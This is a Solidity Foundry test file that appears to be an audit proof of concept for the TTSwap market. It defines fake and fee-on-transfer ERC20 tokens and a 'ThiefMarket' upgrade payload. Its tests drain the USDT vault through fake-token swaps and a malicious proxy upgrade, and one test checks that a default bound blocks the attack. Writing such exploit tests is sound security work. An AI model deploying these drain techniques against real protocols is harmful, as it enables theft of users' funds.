// SPDX-License-Identifier: MIT
pragma solidity 0.8.29;

import {Test} from "forge-std/src/Test.sol";
import {TTSwap_Market} from "src/TTSwap_Market.sol";
import {TTSwap_Market_Proxy} from "src/TTSwap_Market_Proxy.sol";
import {TTSwap_Token} from "src/TTSwap_Token.sol";
import {TTSwap_Token_Proxy} from "src/TTSwap_Token_Proxy.sol";
import {I_TTSwap_Market} from "src/interfaces/I_TTSwap_Market.sol";
import {I_TTSwap_Token} from "src/interfaces/I_TTSwap_Token.sol";
import {T_GoodKey} from "src/type/T_GoodKey.sol";
import {toTTSwapUINT256} from "src/libraries/L_TTSwapUINT256.sol";
import {TTSwapError} from "src/libraries/L_Error.sol";
import {IERC20} from "src/interfaces/IERC20.sol";

contract MockERC20 {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) {
        name = n;
        symbol = s;
    }

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amt) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amt;
        balanceOf[from] -= amt;
        balanceOf[to] += amt;
        return true;
    }
}

/// @dev transferFrom returns true and never moves balances.
contract PhantomERC20 {
    string public name = "PHANTOM";
    string public symbol = "PHAN";
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address, address, uint256) external pure returns (bool) {
        return true;
    }
}

/// @dev 99% fee-on-transfer; still returns true.
contract TaxERC20 {
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;
    uint8 public constant decimals = 18;

    function mint(address to, uint256 amt) external {
        balanceOf[to] += amt;
    }

    function approve(address spender, uint256 amt) external returns (bool) {
        allowance[msg.sender][spender] = amt;
        return true;
    }

    function transfer(address to, uint256 amt) external returns (bool) {
        balanceOf[msg.sender] -= amt;
        balanceOf[to] += amt;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 send = amount / 100;
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= send;
        balanceOf[to] += send;
        return true;
    }
}

/// @dev Upgrade payload: drain ERC20 sitting on the market proxy.
contract ThiefMarket {
    address public implementation;

    function steal(address token, address to) external {
        uint256 bal = IERC20(token).balanceOf(address(this));
        IERC20(token).transfer(to, bal);
    }
}

contract FA_VaultDrain is Test {
    address dao = makeAddr("dao");
    address victim = makeAddr("victim");
    address attacker = makeAddr("attacker");

    MockERC20 usdt;
    I_TTSwap_Token tts;
    I_TTSwap_Market market;
    TTSwap_Market_Proxy marketProxy;

    uint128 constant USDT_Q = 50_000 ether;
    uint128 constant USDT_V = 50_000 ether;
    uint128 constant FAKE_Q = 500_000;
    uint128 constant FAKE_V = 1e28; // 1 wei fake ≈ FAKE_V/FAKE_Q value units

    function setUp() public {
        usdt = new MockERC20("USDT", "USDT");

        TTSwap_Token tokenImpl = new TTSwap_Token(address(usdt));
        TTSwap_Token_Proxy tokenProxy = new TTSwap_Token_Proxy(
            dao,
            0,
            "TTSwap Token",
            "TTS",
            address(tokenImpl)
        );
        tts = I_TTSwap_Token(address(tokenProxy));

        TTSwap_Market marketImpl = new TTSwap_Market(tts);
        marketProxy = new TTSwap_Market_Proxy(tts, address(marketImpl));
        market = I_TTSwap_Market(address(marketProxy));

        vm.startPrank(dao);
        tts.setMarketAdmin(dao, true);
        tts.setEnv(address(market));
        vm.stopPrank();

        usdt.mint(victim, USDT_Q);
        vm.prank(victim);
        usdt.approve(address(market), type(uint256).max);
        vm.prank(victim);
        market.initGood(
            _erc20(address(usdt)),
            toTTSwapUINT256(USDT_V, USDT_Q),
            "",
            victim,
            ""
        );
    }

    function test_FA01_defaultUpper_blocks_fake_sell() public {
        PhantomERC20 phantom = _listPhantom();

        uint256 mBefore = usdt.balanceOf(address(market));
        uint256 want = uint256(USDT_Q) * 30 / 100;

        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        vm.expectRevert(abi.encodeWithSelector(TTSwapError.selector, 55));
        market.payGood(
            _erc20(address(phantom)),
            _erc20(address(usdt)),
            toTTSwapUINT256(uint128(1e18), uint128(want)),
            attacker,
            "",
            attacker,
            "",
            0
        );
        vm.stopPrank();

        assertEq(usdt.balanceOf(address(market)), mBefore, "vault must not move");
    }

    function test_FA02_widenFakeOnly_payGood_drains_usdt() public {
        PhantomERC20 phantom = _listPhantom();
        _widenUpper(uint256(uint160(address(phantom))), 255);

        uint256 mBefore = usdt.balanceOf(address(market));
        uint256 aBefore = usdt.balanceOf(attacker);
        uint256 want = uint256(USDT_Q) * 30 / 100;

        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        market.payGood(
            _erc20(address(phantom)),
            _erc20(address(usdt)),
            toTTSwapUINT256(uint128(1e18), uint128(want)),
            attacker,
            "",
            attacker,
            "",
            0
        );
        vm.stopPrank();

        uint256 mAfter = usdt.balanceOf(address(market));
        uint256 aAfter = usdt.balanceOf(attacker);
        assertLt(mAfter, mBefore, "protocol vault did not shrink");
        assertGt(aAfter, aBefore, "attacker did not receive USDT");
        assertEq(mBefore - mAfter, aAfter - aBefore, "conservation");
        // ~30% of book; fees may shave bps. Require at least 20% of vault.
        assertGe(mBefore - mAfter, uint256(USDT_Q) / 5, "drain too small");
        assertEq(usdt.balanceOf(address(phantom)), 0, "phantom never funded the vault");
    }

    function test_FA03_tax99_payGood_drains_usdt() public {
        TaxERC20 tax = new TaxERC20();
        tax.mint(attacker, 1e30);
        vm.startPrank(attacker);
        tax.approve(address(market), type(uint256).max);
        market.initGood(
            _erc20(address(tax)),
            toTTSwapUINT256(FAKE_V, FAKE_Q),
            "",
            attacker,
            ""
        );
        vm.stopPrank();
        _widenUpper(uint256(uint160(address(tax))), 255);

        uint256 mBefore = usdt.balanceOf(address(market));
        uint256 aBefore = usdt.balanceOf(attacker);
        uint256 want = uint256(USDT_Q) * 30 / 100;

        vm.startPrank(attacker);
        market.payGood(
            _erc20(address(tax)),
            _erc20(address(usdt)),
            toTTSwapUINT256(uint128(1e18), uint128(want)),
            attacker,
            "",
            attacker,
            "",
            0
        );
        vm.stopPrank();

        assertLt(usdt.balanceOf(address(market)), mBefore, "protocol vault did not shrink");
        assertGt(usdt.balanceOf(attacker), aBefore, "attacker did not receive USDT");
        assertGe(mBefore - usdt.balanceOf(address(market)), uint256(USDT_Q) / 5);
    }

    function test_FA04_upgrade_sweeps_vault() public {
        uint256 mBefore = usdt.balanceOf(address(market));
        assertGt(mBefore, 0, "need TVL");

        ThiefMarket thief = new ThiefMarket();
        vm.prank(dao);
        marketProxy.upgrade(address(thief));

        uint256 aBefore = usdt.balanceOf(attacker);
        ThiefMarket(address(marketProxy)).steal(address(usdt), attacker);

        assertEq(usdt.balanceOf(address(market)), 0, "vault not emptied");
        assertEq(usdt.balanceOf(attacker), aBefore + mBefore, "attacker missed TVL");
    }

    function _erc20(address token) internal pure returns (T_GoodKey memory) {
        return T_GoodKey({ercType: 1, contractAddress: token, id: 0});
    }

    function _listPhantom() internal returns (PhantomERC20 phantom) {
        phantom = new PhantomERC20();
        phantom.mint(attacker, 1e30);
        vm.startPrank(attacker);
        phantom.approve(address(market), type(uint256).max);
        market.initGood(
            _erc20(address(phantom)),
            toTTSwapUINT256(FAKE_V, FAKE_Q),
            "",
            attacker,
            ""
        );
        vm.stopPrank();
    }

    /// @dev Admin bits 254-247 = upper, 246-239 = lower. Keep default lower=60.
    function _widenUpper(uint256 goodId, uint256 upper) internal {
        uint256 adminBits = (upper << 247) | (uint256(60) << 239) | (uint256(1) << 237);
        vm.prank(dao);
        market.modifyGoodByAdmin(goodId, adminBits, dao, "");
    }
}
